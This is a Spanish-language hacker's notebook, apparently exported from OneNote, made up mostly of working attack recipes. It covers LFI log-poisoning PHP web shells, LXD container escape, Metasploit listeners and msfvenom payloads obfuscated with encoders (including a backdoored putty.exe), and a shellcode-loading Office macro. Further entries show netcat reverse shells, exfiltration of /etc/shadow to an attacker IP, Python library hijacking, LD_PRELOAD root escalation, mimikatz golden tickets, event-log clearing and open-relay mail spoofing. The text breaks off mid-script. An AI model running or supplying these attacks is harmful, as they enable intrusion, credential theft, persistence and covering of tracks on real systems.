[http://example.com/index.php?page=/var/log/apache/access.log](http://example.com/index.php?page=/var/log/apache/access.log)
[http://example.com/index.php?page=/var/log/apache/error.log](http://example.com/index.php?page=/var/log/apache/error.log)
[http://example.com/index.php?page=/var/log/apache2/access.log](http://example.com/index.php?page=/var/log/apache2/access.log)
[http://example.com/index.php?page=/var/log/apache2/error.log](http://example.com/index.php?page=/var/log/apache2/error.log)
[http://example.com/index.php?page=/var/log/nginx/access.log](http://example.com/index.php?page=/var/log/nginx/access.log)
[http://example.com/index.php?page=/var/log/nginx/error.log](http://example.com/index.php?page=/var/log/nginx/error.log)
[http://example.com/index.php?page=/var/log/vsftpd.log](http://example.com/index.php?page=/var/log/vsftpd.log)
[http://example.com/index.php?page=/var/log/sshd.log](http://example.com/index.php?page=/var/log/sshd.log)
[http://example.com/index.php?page=/var/log/mail](http://example.com/index.php?page=/var/log/mail)
[http://example.com/index.php?page=/var/log/httpd/error\_log](http://example.com/index.php?page=/var/log/httpd/error_log)
[http://example.com/index.php?page=/usr/local/apache/log/error\_log](http://example.com/index.php?page=/usr/local/apache/log/error_log)
[http://example.com/index.php?page=/usr/local/apache2/log/error\_log](http://example.com/index.php?page=/usr/local/apache2/log/error_log)

_Desde \&lt;_[_https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-procfd_](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-procfd)_\&gt;_

git clone [https://github.com/D35m0nd142/LFISuite.git](https://github.com/D35m0nd142/LFISuite.git)

_Desde \&lt;_[_https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/_](https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/)_\&gt;_



/var/log/httpd-access.log

/var/log/apache2/access.log

/var/log/auth.log --\&gt; ssh &#39;\&lt;?php system($\_GET[&#39;c&#39;]); ?\&gt;&#39;@192.168.1.129

_Desde \&lt;_[_https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/_](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/)_\&gt;_

_Desde \&lt;_[_https://www.hackingarticles.in/apache-log-poisoning-through-lfi/_](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/)_\&gt;_

![](RackMultipart20210412-4-pcx9xb_html_1148c083a6cb92a8.png)

se podrá hacer una carga, de página editando el user-agent de tal forma que cuando se cargue nuevamente el log, ejecute un script

ejemplo

\&lt;?php system($\_GET[&#39;c&#39;]); ?\&gt;

tras eso, ya podemos levantar nuestro nc -lnvp 1234

y ejecutar un revershell



# Lxd attack

lunes, 22 de junio de 2020

12:53

## Nota:

Probar este escape de shell en docker

docker run -v /:[/mnt](tg://bot_command?command=mnt) --rm -it alpine chroot [/mnt](tg://bot_command?command=mnt) sh

--------------------------------------------------

## Método 1

En nuestra máquina:

wget [https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
mkdir -p /root/rootfs/usr/share/alpine-mirrors/

echo &quot;[http://mirrors.tuna.tsinghua.edu.cn/alpine/](http://mirrors.tuna.tsinghua.edu.cn/alpine/)&quot;\&gt;/root/rootfs/usr/share/alpine-mirrors/MIRRORS.txt

sudo bash build-alpine

mv \&lt;nombrelargoreciengenerado\&gt; alpine.tgz

Luego copiar al destino.

╰─⠠⠵ scp alpine.tgz dale@team:

En maquina destino:

lxc image import ./alpine.tgz --alias myimage
 lxd init
 lxc init myimage mycontainer -c security.privileged=true
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 lxc start mycontainer
 lxc exec mycontainer /bin/sh

#

[https://steflan-security.com/?p=2123](https://steflan-security.com/?p=2123)



## Método 2 (más explicado)

En caso de ejecutar id aparezca el usuario asociado a lxd podría ser vulnerable a un ataque al contenedor.

[https://www.exploit-db.com/exploits/46978](https://www.exploit-db.com/exploits/46978)

Los usuarios con el grupo lxd pueden crear contenedores en el sistema el cual puede ser usado para acceder al resto del los directorio y ganar acceso root en la máquina principal.



wget [https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
mkdir -p /root/rootfs/usr/share/alpine-mirrors/

echo &quot;[http://mirrors.tuna.tsinghua.edu.cn/alpine/](http://mirrors.tuna.tsinghua.edu.cn/alpine/)&quot;\&gt;/root/rootfs/usr/share/alpine-mirrors/MIRRORS.txt

sudo bash build-alpine

mv \&lt;nombrelargoreciengenerado\&gt; alpine.tgz

_Desde \&lt;_[_https://blog.szymex.pw/thm/breakoutthecage1.html_](https://blog.szymex.pw/thm/breakoutthecage1.html)_\&gt;_

After running this we can transfer the &quot;alpine-\*.tar.gz&quot; file to the machine and run the script

![](RackMultipart20210412-4-pcx9xb_html_ab7958491abb038.png)



![](RackMultipart20210412-4-pcx9xb_html_5e91e3a5b9c0b609.png)



# Memcached - explotación del puerto 11211

martes, 9 de marzo de 2021

11:33

telnet localhost 11211

stats items (shows everything in the cache)

stats cachedump 1 0 (dump everything in the slab id(1))

get user (user query information in the cache)

get password (password query information in the cache)press Ctrl+] to bring up the telnet prompt

type close to exit from telnet

_Desde \&lt;_[_https://anubhavuniyal.medium.com/tryhackme-wekor-writeup-a01b851f651d_](https://anubhavuniyal.medium.com/tryhackme-wekor-writeup-a01b851f651d)_\&gt;_



# METASPLOIT - Cómo explotar vulnerabilidades

jueves, 7 de mayo de 2020

14:42

[https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463/](https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463/)

##

## Comandos útiles

Search

Use

Help

Show options // info // options

Show advanced

sessions -l (listar sesiones abiertas)

sessions -i \&lt;numerosesion\&gt;

background (deja sessions en espera )

back (sale del modulo)

exit (sale de msfconsole)

![](RackMultipart20210412-4-pcx9xb_html_aa6b63993e5ab8bc.png)

## Para levantar un Listener

Manualmente:

Use Exploit/multi/Handler

Set PAYLOAD windows/meterpreter/reverse\_tcp

Set LPORT \&lt;LPORT\&gt;

Set LHOST \&lt;LHOST\&gt;

Set exitonsessions false

Exploit -j

También se puede ejecutar directamente desde fuera de la consola con:

msfconsole -x &quot;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse\_tcp; set LHOST \&lt;IPAtacante\&gt;; set LPORT \&lt;puertoelegido\&gt;; run;exit -y&quot;

O escribir todo el listado en un archivo handler.rc y ejecutar

Msfconsole -r handler.rc

MSFPC -\&gt; Metasploit Payload Creator

msfpc windows \&lt;iplocal\&gt; \&lt;puertolocal\&gt;

creará el payload y el .rc para comunicación automática.

## Dentro del Meterpreter

getuid : Muestra los privilegios actuales

getsystem : obtiene privilegios de sistema

cleanev : Para eliminar eventos de windows que pueden incriminar



Timestomp :

meterpreter \&gt; execute -f &quot;cmd.exe /c systeminfo \&gt; systeminfo.txt&quot;



## Para crear PAYLOAD

Msfvenom -p windows/x64/meterpreter\_reverse\_tcp LHOST=\&lt;lhost\&gt; LPORT=\&lt;lport\&gt; -f exe -o \&lt;dirdestino\&gt; -x calc -f exe -e x86/shikata\_ga\_nai -i 2 | msfvenom -e cmd/powershell -i 1 -f exe -o \&lt;dir/name.exe\&gt;

para ofuscarlo con encoders.

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse\_tcp LHOST=\&lt;\&gt; LPORT=\&lt;\&gt; -e x86/shikata\_ga\_nai -i 10 -f vba -o /root/Desktop/office-backdoor -\&gt; para crear un macro office ofuscado 10 veces.

msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse\_tcp lhost=192.168.1.63 -e x86/shikata\_ga\_nai -i 3 -b &quot;\x00&quot; -f exe -o putty2.exe



## Para ejecutar Persistencia

use post/windows/manage/persistence\_exe

Set REXENAME nombre que quedará

Set REXEPATH ruta donde está el payload

Set SESSION cual sesion se tiene la víctima

Set STARTUP (user/system/service)

## Para extraer el hash de un windows (puede mostrar pass directamente)

Run post/windows/gather/hashdump

## Para tener acceso a las redes de la víctima

run post/multi/manage/autoroute

## Para explotar smb en windows

Use exploit/windows/smb/psexec\_psh

## Auxiliares o exploits genéricos útiles

auxiliary/scanner/ssh/ssh\_login -\&gt; usa diccionario para loguearse. Una vez exitoso, automáticamente abre una sesión shell

auxiliary/scanner/telnet/telnet\_login -\&gt; usa diccionario para loguearse. Una vez exitoso, automáticamente abre una sesión shell. También sirve para tener una shell conociendo las credenciales.

auxiliary/scanner/snmp/snmp\_enum/

post/multi/recon/local\_exploit\_suggester para que nos indique que es o mejor para escalamiento de privilegios

exploit/multi/http/php\_cgi\_arg\_injection -\&gt; para explotar cgi en php (puerto 80)

exploit/multi/samba/usermap -\&gt;para el puerto 139. Obtiene un meterpreter

exploit/multi/misc/java\_rmi\_server -\&gt; para puerto 1099, RMI de java. Levanta un meterpreter.

exploit/linux/postgres/postgres\_payload -\&gt; para explotar postgres. Puesto 5432

exploit/unix/irc/unreal\_ircd\_3281\_backdoor -\&gt; para explotar IRC unreal puerto 6667

windows/local/bypassuac\_fodhelper -\&gt; para elevar privilegios luego de tomar meterpreter.

windows/iis/iis\_webdav\_scstoragepathfromurl --\&gt; para tomar sesión de un iis 6.0 con webdav habilitado

## Para hacer Pivoting

Una vez tomado el equipo con meterpreter, se identificará otro objetivo dentro de la red interna de la víctima:

ipconfig

para identificar la interfaz y la IP+mascara del segmento interno

run arp\_scanner -r \&lt;ipinternadevictima.\*\&gt;

para identificar host vivos en el segmento

Background

para salir de meterpreter sin perder la sesión.

route add \&lt;ipinternavictima.0\&gt; \&lt;mascaravictima\&gt; \&lt;idSession\&gt;

para enrutar ese segmento a la comunicación

use auxiliary/server/socks4a



set srvhost 127.0.0.1

para direccionar como local las instrucciones desde kali

## Para pasar de shell a meterpreter

post/multi/manage/shell\_to\_meterpreter

Se le debe indicar la sesión que esté tomada



Macro example

#If Vba7 Then

Private Declare PtrSafe Function CreateThread Lib &quot;kernel32&quot; (ByVal Hpxhdrqmi As Long, ByVal Cyuo As Long, ByVal Cbp As LongPtr, Xrah As Long, ByVal Okmqted As Long, Rxgz As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib &quot;kernel32&quot; (ByVal Stbor As Long, ByVal Ycgy As Long, ByVal Xkvfcobfp As Long, ByVal Mzxdow As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib &quot;kernel32&quot; (ByVal Urwtaja As LongPtr, ByRef Pcjylen As Any, ByVal Rpuemu As Long) As LongPtr

#Else

Private Declare Function CreateThread Lib &quot;kernel32&quot; (ByVal Hpxhdrqmi As Long, ByVal Cyuo As Long, ByVal Cbp As Long, Xrah As Long, ByVal Okmqted As Long, Rxgz As Long) As Long

Private Declare Function VirtualAlloc Lib &quot;kernel32&quot; (ByVal Stbor As Long, ByVal Ycgy As Long, ByVal Xkvfcobfp As Long, ByVal Mzxdow As Long) As Long

Private Declare Function RtlMoveMemory Lib &quot;kernel32&quot; (ByVal Urwtaja As Long, ByRef Pcjylen As Any, ByVal Rpuemu As Long) As Long

#EndIf

Sub Auto\_Open()

Dim Fvyarf As Long, Ohjnpgj As Variant, Oyvx As Long

#If Vba7 Then

Dim Yigezqed As LongPtr, Nlgbsy As LongPtr

#Else

Dim Yigezqed As Long, Nlgbsy As Long

#EndIf

Ohjnpgj = Array(211,186,66,10,140,106,217,116,36,244,91,51,201,177,147,49,83,23,3,83,23,131,129,14,110,159,220,207,183,20,250,59,24,109,10,169,149,95,35,248,107,211,176,21,119,221,241,253,139,89,225,114,76,109,196,120,252,49,127,189,106,37,106,118,187,156,8,243,41,25,192,230,237,58,57,247,199,79,125,22, \_

175,163,40,93,209,255,76,187,124,16,163,88,212,29,26,167,0,209,105,4,84,241,39,100,153,51,57,95,144,26,146,135,135,249,192,178,196,18,36,24,77,242,73,252,98,164,47,235,166,226,20,192,253,49,151,108,162,99,26,170,80,77,117,246,220,228,173,185,208,15,99,177,186,71,67,78,136,83,9,210, \_

143,111,155,202,203,178,7,20,79,91,107,231,225,76,229,238,135,201,102,174,37,5,222,124,62,171,70,211,112,84,26,135,184,215,49,162,226,31,113,227,151,50,228,78,152,188,89,119,135,121)

Yigezqed = VirtualAlloc(0, UBound(Ohjnpgj), &amp;H1000, &amp;H40)

For Oyvx = LBound(Ohjnpgj) To UBound(Ohjnpgj)

Fvyarf = Ohjnpgj(Oyvx)

Nlgbsy = RtlMoveMemory(Yigezqed + Oyvx, Fvyarf, 1)

Next Oyvx

Nlgbsy = CreateThread(0, 0, Yigezqed, 0, 0, 0)

End Sub

Sub AutoOpen()

Auto\_Open

End Sub

Sub Workbook\_Open()

Auto\_Open

End Sub



# Metodología para hackear servidores web

jueves, 7 de mayo de 2020

14:42

Netdiscover

Nmap -A \&lt;victima\&gt;

Wpscan y/o nikto

Searchexploit \&lt;sistema descubierto\&gt;

Descargar exploit

Ejecutar exploit

Elevación de privilegios

Persistencia



# Mobsf - analizador de APK

lunes, 8 de marzo de 2021

17:58

docker pull opensecurity/mobile-security-framework-mobsf

docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf

[http://0.0.0.0:8000](http://0.0.0.0:8000/)







# mimikatz

jueves, 20 de agosto de 2020

20:21

Mimikatz.exe

privilege::debug

lsadump::lsa /inject /name:\&lt;user\&gt;

![](RackMultipart20210412-4-pcx9xb_html_4ffd5f54d2d2cbea.png)

Create a Golden/Silver Ticket -

﻿1.) Kerberos::golden /user:Administrator /domain:controller.local /sid:\&lt;domainsid\&gt; /krbtgt:\&lt;primary:NTLM\&gt; /id:500

Use the Golden/Silver Ticket to access other machines -

﻿1.) misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz.

![](RackMultipart20210412-4-pcx9xb_html_f1e8ad9544aabacb.png)



# Mysql Exploit

martes, 21 de julio de 2020

11:06

Searchsploit –m 1518

\* Usage:

\* $ id

\* uid=500(raptor) gid=500(raptor) groups=500(raptor)

\* $ gcc -g -c raptor\_udf2.c

\* $ gcc -g -shared -Wl,-soname,raptor\_udf2.so -o raptor\_udf2.so raptor\_udf2.o -lc

\* $ mysql -u root -p

\* Enter password:

\* [...]

\* mysql\&gt; use mysql;

\* mysql\&gt; create table foo(line blob);

\* mysql\&gt; insert into foo values(load\_file(&#39;/home/raptor/raptor\_udf2.so&#39;));

\* mysql\&gt; select \* from foo into dumpfile &#39;/usr/lib/raptor\_udf2.so&#39;; _\*\*\*\*Ojo en este punto por que puede salir un error donde iondique donde debe hacerse el dump_

\* mysql\&gt; create function do\_system returns integer soname &#39;raptor\_udf2.so&#39;;

\* mysql\&gt; select \* from mysql.func;

\* +-----------+-----+----------------+----------+

\* | name | ret | dl | type |

\* +-----------+-----+----------------+----------+

\* | do\_system | 2 | raptor\_udf2.so | function |

\* +-----------+-----+----------------+----------+

\* mysql\&gt; select do\_system(&#39;id \&gt; /tmp/out; chown raptor.raptor /tmp/out&#39;);

\* mysql\&gt; \! sh

\* sh-2.05b$ cat /tmp/out



-----------------------------------------------

Show databases;

Show tables;

Select \* from \&lt;table\&gt;;



# NETCAT (NC)

jueves, 7 de mayo de 2020

14:43

nc -vnlp \&lt;port\&gt; (para quedar listener)

nc -zv 192.168.122.228 1-65535 sirve para probar conexión en todos los puertos.

Shell directa

En Windows 7 (Objetivo de Evaluación) C:\\&gt;nc -v -n -l -p 7777 -e cmd.exe

En Kali Linux (El Atacante) # nc -n -v 192.168.0.15 7777

Reverse shell

En Kali Linux # nc -n -v -l -p 8888

En Windows 7 C:\\&gt;nc -n -v 192.168.0.12 8888 -e cmd.exe

Send a file over TCP port 9899 from host2 (client) to host1 (server).

HOST1$ ncat -l 9899 \&gt; outputfile

HOST2$ ncat HOST1 9899 \&lt; inputfile

------------



nc -nvlp 8081

sudo wget --post-file=/etc/shadow 10.10.14.12:8081 -\&gt; para exfiltrar archivos.

Create an HTTP proxy server on localhost port 8888.

ncat -l --proxy-type http localhost 8888

nc -e /bin/bash o /bin/sh tuIP puerto para levantar una shell.

para evitar que la sesión se caiga, si estás haciendo por ejemplo un &#39;nc -e /bin/bash tuIP puerto&#39;, hazle un

nohup nc -e /bin/bash tuIP puerto &amp;



# NFS explore

Monday, May 18, 2020

6:12 PM

_showmount -e ip-address_

This command shows all the shares exported by NFS.

If this command outputs any shares, you can try mount the shares on to your file system

_mount ip:/file/path /local/file/path_





# NULL SESSION - Cómo conectarse a un servicio SMB vulnerable

jueves, 7 de mayo de 2020

14:43

Windows: Net Use \\\&lt;ip\&gt;\IPC$ &quot;&quot; /u: &quot;&quot;



Linux: smbclient \\\\\&lt;ip\&gt;\\IPC\$ &quot;&quot; -U &quot;&quot;

smbclient \\\\\&lt;ip\&gt; -N (null session)

rpcclient -U &quot;&quot; IP\_ADDRESS

para enumeración The most interesting are &#39;enumdomusers&#39;, &#39;netshareenum&#39;, &#39;netshareenumall&#39;



mount -t cifs //10.10.10.40/Users /mnt/\&lt;dircreado\&gt; -o username=null,password=nul,domain=WORKGROUP,rw

En msf hay un exploit que permite tomar el control root. exploit/multi/samba/usermap\_script



we can use the excellent tool &#39;enum4linux&#39;

This vulnerability can be mitigated by setting the DWORD value &#39;RestrictAnonymous&#39; to 1 in HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\LSA



# NMAP - Como mapear la red (Reconocimiento)

jueves, 7 de mayo de 2020

14:43

nmap -sn \&lt;rangoIP\&gt;

para ver equipos prendidos ((se puede reemplazar por Netdiscover))

nmap -n -vvv -sS -Pn --min-rate 5000 \&lt;ip\&gt; -oN allports



para recorrer puertos abiertos de forma rápida.

nmap -A \&lt;ip\&gt;

para que entregue todos lo datos posibles del target. Se puede agregar -p \&lt;port\&gt; si interesa sólo un puerto.

nmap -v -sI \&lt;ipZombie\&gt;:\&lt;PuertoAbierto\&gt; \&lt;IPaEscanear\&gt;

Cuando se tiene el control de un zombie se puede ocupar para realizar nmap.

También se pueden usar equipos vulnerables buscándolo los incrementales o brokenlittleindian con el auxiliar de metasploit: use auxiliary/scanner/id/ipidseq

nmap --script \&lt;(echo &#39;os.execute(&quot;/bin/sh&quot;)&#39;) # setuid nmap privesc.

Older version? try nmap --interactive

increíblemente permite ejecutar órdenes de root si se le precede de un !, ejemplo !id , !ls /root, !cat !sh

Nmap \&lt;argumento\&gt; --user-agent=&quot;Mozilla 5 (compatible , Googlebot/2.1,[http://www.google.com/bot.html)&quot;](http://www.google.com/bot.html)%22)

sirve para hacerse pasar por bot de google.

nmap -sC -sV -p445 --script smb-vuln-ms17-010.nse 192.168.0.100

para probar si el equipo es vulnerable a eternalblue (también es posible con un scan de metasploit)

nmap -sT -n -p 6200-6800 \&lt;ip de equipo windows\&gt;

si encontramos abierto el 6262 podremos usar el exploit use exploit/multi/http/manageengine\_search\_sqli

nmap –script vuln -p445 10.10.10.4 -v

escanea vulnerabilidades en un puerto específico.

nmap xx.x..x..x -sT -sC -p 21

revisará si puede usar anonymous

nmap --spoof-mac 0 192.168.1.1



realizará un spoof de mac aleatorio.



# OPEN RELAY Cómo hacer spoofing de correo

jueves, 7 de mayo de 2020

14:44

# Cómo enviar un correo via OPEN RELAY (telnet con proxychains)



Proxychains telnet mx.patricioleon.cl 25

HELO mx.patricioleon.cl

MAIL FROM: [desarrollo@patricioleon.cl](mailto:desarrollo@patricioleon.cl)

RCPT TO: [patricioleonm@yahoo.com](mailto:patricioleonm@yahoo.com)

DATA

\&lt;texto\&gt;

.

QUIT

# Cómo leer correos via OPEN RELAY (telnet con proxychains)

Sudo service tor start

proxychains telnet midominiodemail 110

El sistema en caso de poder conectar debería responder de inmediato con un OK

Luego para loguearnos, simplemente ejecutamos:

**USER** usuario

**PASS** password

Con esto obtendremos un OK en caso de poder ingresar exitosamente, luego podremos continuar leyendo mails con los siguientes comandos:

**STAT** (status) solicita el estado de tu buzón de correos. El servidor responderá informando de cuantos mensajes hay a la espera, en el siguiente formato: +OK mm bb, donde mm es el numero de mensajes, y bb el numero de bytes del total.

**LIST** te lista todos los mensajes (identificador más el tamaño). Puedes ejecutarlo solo (ofrecerá el numero total de mensajes) o con un argumento (numero de mensaje) y solo obtendrás como respuesta el tamaño de ese mensaje.

**TOP** nn nl para ver las cabeceras y primeras lineas del mensaje (nn sería el numero del mensaje que quieras ver, nl el numero de lineas de la cabecera, p ej: TOP 1 ALL)

**RETR #** para ver un mensaje, debe especificarse su numero en la lista

**DELE #** borra el mensaje elegido. El borrado no es al enviar el comando, sino al terminar la sesión

**RSET** recupera los mensajes marcados para borrado

**NOOP** (No Operation) instruye al servidor para que no ejecute ninguna acción, salvo responder con un mensaje de confirmación (+OK).

**UIDL** (Unique Identifier List) sirve para asignar un identificador único a todos los mensajes o a uno especifico.

**APOP** (Authenticate Post Office Protocol) Este comando puede ser usado como sustituto del binomio USER – PASS para identificar y validar un usuario. Su utilidad es evitar que el password del usuario viaje por la red de forma no encriptada. La sintaxis es: APOP (nombre) (codigo).

**QUIT** cierra la conexión. Si se cierra la sesión sin este comando, los mensajes marcados para borrado no se destruiran.



# OPENSSL - Cómo crear un certificado

jueves, 7 de mayo de 2020

14:44

root@kali:~# openssl genrsa -out ca.key 4096

Generating RSA private key, 4096 bit long modulus

..................++

..........++

e is 65537 (0x010001)



root@kali:~# openssl req -new -x509 -days 365 -key ca.key -out ca.crt

You are about....

-----

Country Name (2 letter code) [AU]:US

State or Province Name (full name) [Some-State]:Texas

Locality Name (eg, city) []:San Antonio

Organization Name (eg, company) [Internet Widgits Pty Ltd]:Mr. Robot

Organizational Unit Name (eg, section) []:IT

Common Name (e.g. server FQDN or YOUR name) []:company.org

Email Address [[]:mrrobot@fsocierty.org](mailto:%5D:mrrobot@fsocierty.org)



Para generar una contraseña válida en el sistema para loguearse en linux

openssl passwd

------------

$ openssl passwd -1 -salt [username] [password]

The original format of root entry:

root:x:0:0:root:/root:/bin/bash

the x is a placeholder for the password, which the system retrieves the hash from /etc/shadow

if we replace x with a hash generated by openssl, we can login

- you can also make a new account and set the UID to 0, and it&#39;ll be treated as root as well

[https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)



openssl enc -in c.07.txt -out binarytext -d -a &amp;&amp; openssl rsautl -decrypt -in binarytext -out flag07.txt -inkey c.07.key &amp;&amp; cat flag07.txt

Decifra primero el base64 &amp;&amp; decifra con la llave rsa &amp;&amp; muestra el resultado.



Cómo crear un id\_rsa (sirve para utilizarlo de authenticated\_keys)

$ssh-keygen -t rsa -b 4096

Si es de prueba (prefiere usar sin password)

El id\_rsa debe usarse para el ssh algo@hostname -i id\_rsa

Y el id\_rsa.pub debe transformarse en el authenticated\_keys







# Payloads

lunes, 1 de marzo de 2021

20:46

[https://github.com/payloadbox/](https://github.com/payloadbox/)



# Owasp

lunes, 13 de julio de 2020

16:31

[https://www.hacksplaining.com/lessons](https://www.hacksplaining.com/lessons)



# Port Knocking

jueves, 7 de mayo de 2020

14:44

![](RackMultipart20210412-4-pcx9xb_html_525618e6aef1cebe.png)

Se le llama port knocking cuando tras una llamada a una secuencia de puertos, el puerto necesario se abre.

en el ejemplo.. se tiene la información que se debe golpear los puertos 3456 8234 62431 (y además se tiene la contraseña)

para poder ingresar, se

comando

acá el archivo donde se configura.. si es que uno ya está dentro del equipo.

![](RackMultipart20210412-4-pcx9xb_html_697a1b6a52920dd2.png)



# Privesc

lunes, 27 de julio de 2020

18:12

**getcap -r / 2\&gt;/dev/null** --\&gt;sirve para mirar suid binaries (capabilities)

![](RackMultipart20210412-4-pcx9xb_html_77687a8fdba692ba.png)

setcap cap\_setuid+ep \&lt;ruta\_al\_bin\&gt; --\&gt;para agregar setuid.

[https://man7.org/linux/man-pages/man7/capabilities.7.html](https://man7.org/linux/man-pages/man7/capabilities.7.html)

Ejemplos de utilización de herramientas frecuentes y GTFObins o lolbins

[https://wadcoms.github.io](https://wadcoms.github.io/)



Linux VM



1. In command prompt type: **sudo -l**

2. From the output, notice that the **LD\_PRELOAD** environment variable is intact.



**Exploitation**



1. Open a text editor and type:



**#include \&lt;stdio.h\&gt;**

**#include \&lt;sys/types.h\&gt;**

**#include \&lt;stdlib.h\&gt;**



**void \_init() {**

**unsetenv(&quot;LD\_PRELOAD&quot;);**

**setgid(0);**

**setuid(0);**

**system(&quot;/bin/bash&quot;);**

**}**



2. Save the file as x.c

3. In command prompt type:

**gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles**

4. In command prompt type:

**sudo LD\_PRELOAD=/tmp/x.so apache2**

5. In command prompt type: **id**



**Cómo compilar en C**

gcc \&lt;nombreque tiene que tener la extensión.c\&gt; -o \&lt;ejecutable\&gt; -pthread





# Pyrit

jueves, 7 de mayo de 2020

14:47

para atacar un pcap con handshake desde base de datos (forma muy rápida)

pyrit -e \&lt;nombreap\&gt; create\_essid

pyrit -i \&lt;dict\&gt; import\_passwords

pyrit batch

pyrit -r \&lt;archivo.pcap\&gt; attack\_db



# Printer

miércoles, 30 de septiembre de 2020

15:27

[http://hacking-printers.net/wiki/index.php/Printer\_Security\_Testing\_Cheat\_Sheet](http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet)

git clone [https://github.com/RUB-NDS/PRET](https://github.com/RUB-NDS/PRET) &amp;&amp; cd PRET

python2 -m pip install colorama pysnmP

![](RackMultipart20210412-4-pcx9xb_html_7f14c90cb5b68fdd.png)



# Python - Session Simple

jueves, 18 de junio de 2020

12:55

#!/usr/bin/env python

Import requests

url = &quot;[http://challenge.acictf.com:48438/](http://challenge.acictf.com:48438/)&quot;

s = requests.Session()

data = {

&quot;username&quot;:&quot;username&quot;,

&quot;password&quot;:&quot;password&quot;,

}

r = s.post(url + &quot;register&quot;, data = data)

r = s.get(url)

print(r.text)

print(s.cookies)

s.close()





Python para extraer información de un TXT e ingresarla en una base de datos postgres

#!/usr/bin/python

#-\*- coding:UTF-8 -\*-

import re

import psycopg2

import sys

# Conectamos a la base de datos creada anteriormente

conn = psycopg2.connect(&quot;host=localhost dbname=&#39;servel&#39; user=&#39;postgres&#39; password=&#39;demo21&#39;&quot;)

cur = conn.cursor()

# recibimos el nombre del archivo txt (ruta completa)

archivo = sys.argv[1]

# guardamos el resultado en un archivo txt para trabajar mejor

txt = open(archivo,&#39;r&#39;)

lineas = txt.readlines()

# recorremos las páginas linea por linea

for linea in lineas:

# verificamos si en la linea se encuentra un rut mediante una expresión regular

if re.search(&#39;0\*(\d{1,3}(\.?\d{3})\*)\-?([\dkK])&#39;, linea):

# si lo encuentra guardamos el rut

busqueda = re.search(&#39;0\*(\d{1,3}(\.?\d{3})\*)\-?([\dkK])&#39;, linea)

rut = busqueda.group(0)

# la regex devolvia tambien unos numeros solos, en vez de un rut

# asi que verificamos si en el valor devuelto por la regex existe el guión

if &#39;-&#39; in rut:

# de existir el guión es porque es un rut

# asi que separamos la linea en el rut

cortar = linea.split(rut)

# obtenemos los datos y quitamos los espacios en blancos

nombre = cortar[0].replace(&#39; &#39;,&#39;&#39;)

informacion = cortar[1].replace(&#39; &#39;,&#39;&#39;)

sinpuntoSplit = rut.replace(&#39;.&#39;,&#39;&#39;).split(&#39;-&#39;)

sinpunto = sinpuntoSplit[0]

dv = sinpuntoSplit[1]

# guardamos los datos en la BD

cur.execute(&quot;INSERT INTO persona (nombre\_persona,rut\_persona,run\_persona,dv\_persona,informacion\_persona) VALUES (%s, %s, %s, %s, %s)&quot;,((nombre,rut,sinpunto,dv,informacion)))

# print que muestra el dato ingresado

print nombre + &#39; &#39; + sinpunto + &#39; &#39; + dv + &#39; &#39; + informacion

# ejecutamos la sentencia

conn.commit()

conn.close()

![](RackMultipart20210412-4-pcx9xb_html_9aaa4101944e7bc.png)



# Python - library hijacking

viernes, 8 de mayo de 2020

11:24

python -c &#39;import sys; print(sys.path)&#39;

_Desde \&lt;_[_https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7_](https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7)_\&gt;_



En tanto se encuentre un .py que ejecute comandos de forma automática o con permisos elevados, podemos explotarlo en tanto haga un llamado a alguna librería.

Script a incorporar



#!/usr/bin/python3

import os

def make\_archive(dummy\_arg1 = None, dummy\_arg2 = None, dummy\_arg3 = None):

os.system(&#39;nc 10.10.14.74 4545 -e /bin/bash &amp;&#39;)



Donde dummy\_argX son las variables que entraban en el .py original.



Si necesitamos piraterar la librería shutil, entonces hacemos que el script se llame shutil.py y lo dejamos en un lugar reconocible.

Luego ejecutamos el .py original con los siguientes parámetros

Sudo PYTHONPATH=\&lt;ruta a la librería pirateada\&gt; \&lt;ruta al py original\&gt;







# Python - script de fuzeo

domingo, 24 de enero de 2021

17:27

#!/usr/bin/python3

import requests, re, sys, signal

main\_url = f&quot;http://10.10.93.66:8085/&quot;

if \_\_name\_\_ == &#39;\_\_main\_\_&#39;:

s = requests.session()

for number in range(10000,99999):

headers\_data = {

&#39;Host&#39;: &#39;10.10.93.66:8085&#39;,

&#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Ubuntu; Linux x86\_64; rv:80.0) Gecko/20100101 Firefox/80.0&#39;,

&#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8&#39;,

&#39;Accept-Language&#39;: &#39;en-US,en;q=0.5&#39;,

&#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,

&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,

&#39;Origin&#39;: &#39;[http://10.10.206.146:8085](http://10.10.206.146:8085/)&#39;,

&#39;Connection&#39;: &#39;keep-alive&#39;,

